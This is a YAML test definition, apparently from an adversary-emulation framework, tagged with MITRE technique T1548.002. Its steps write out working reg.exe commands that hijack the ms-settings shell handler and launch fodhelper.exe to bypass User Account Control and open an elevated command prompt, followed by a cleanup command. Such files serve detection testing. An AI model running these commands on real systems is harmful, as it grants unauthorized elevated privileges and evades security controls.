api_version: "2.0"
name: Bypass UAC using Fodhelper
description: |
    Bypasses User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.
    Upon execution, "The operation completed successfully." will be shown twice and command prompt will be opened.
args:
    - name: executable_binary
      type: path
      default: C:\Windows\System32\cmd.exe
uuid: 58f641ea-12e3-499a-b684-44dee46bd182
mitre:
    tactics:
        - 'TA0004: Privilege Escalation'
        - 'TA0005: Defense Evasion'
    techniques:
        - 'T1548: Abuse Elevation Control Mechanism'
    subtechniques:
        - 'T1548.002: Bypass User Account Control'
requirements:
    platforms:
        - os: windows
steps:
    - name: bypass-uac-using-fodhelper
      inline: |
        reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "{{.Args.executable_binary}}" /f
        reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f
        fodhelper.exe
      executor: command_prompt
      cleanup:
        inline: |
            reg.exe delete hkcu\software\classes\ms-settings /f >nul 2>&1
        executor: command_prompt
